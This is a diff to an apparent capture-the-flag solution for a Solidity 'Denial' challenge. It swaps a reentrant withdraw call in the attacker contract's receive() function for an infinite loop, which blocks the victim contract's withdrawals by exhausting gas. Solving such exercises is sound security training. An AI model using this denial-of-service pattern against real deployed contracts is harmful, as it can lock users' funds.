@@ -37,19 +37,11 @@ contract Denial {
 
 // TODO:
 contract Solution20 {
-    Denial public denial;
-    uint256 public count;
     function hack(Denial _denial) public {
         _denial.setWithdrawPartner(address(this));
-        denial = _denial;
     }
 
-    // fallback() external {
-    //     denial.withdraw();
-    // }
-
     receive() external payable {
-        count++;
-        denial.withdraw();
+        while(true){}
     }
 }
